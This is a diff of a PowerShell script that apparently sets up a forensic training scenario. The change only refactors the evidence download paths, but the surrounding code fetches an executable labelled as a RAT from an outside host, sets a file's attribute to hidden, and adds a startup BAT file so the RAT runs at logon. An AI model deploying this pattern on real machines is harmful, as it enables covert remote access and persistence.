@@ -20,6 +20,8 @@ param(
 $raturl = "http://north2.hub.envar.io/vault76kg/drvfrw.exe"
 # For C51 additional evidence file was provided by CC - downloading to D:\
 $evidenceurl = "http://north2.hub.envar.io/vault76kg/20210429C51EVIDENCE.zip"
+$evidence = "D:\evidence.zip"
+$evidenceoutput = "D:\EvidenceFiles"
 $startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\runadm.bat"
 
 
@@ -34,10 +36,10 @@ $hideFile = get-item $localpath -Force
 $hideFile.attributes = "Hidden"
 
 # Download EVIDENCE to Temporary Storage
-New-Item -Path 'D:\EvidenceFiles' -ItemType Directory
-Invoke-WebRequest -uri $evidenceurl -OutFile 'D:\evidence.zip'
-expand-archive -path 'D:\evidence.zip' -destinationpath 'D:\EvidenceFiles'
-Remove-Item 'D:\evidence.zip'
+New-Item -Path $evidenceoutput -ItemType Directory
+Invoke-WebRequest -uri $evidenceurl -OutFile $evidence
+expand-archive -path $evidence -destinationpath $evidenceoutput
+Remove-Item $evidence
 
 # Add a startup script (BAT) to make sure RAT is run by the logging user
 add-content $startup "@echo off"
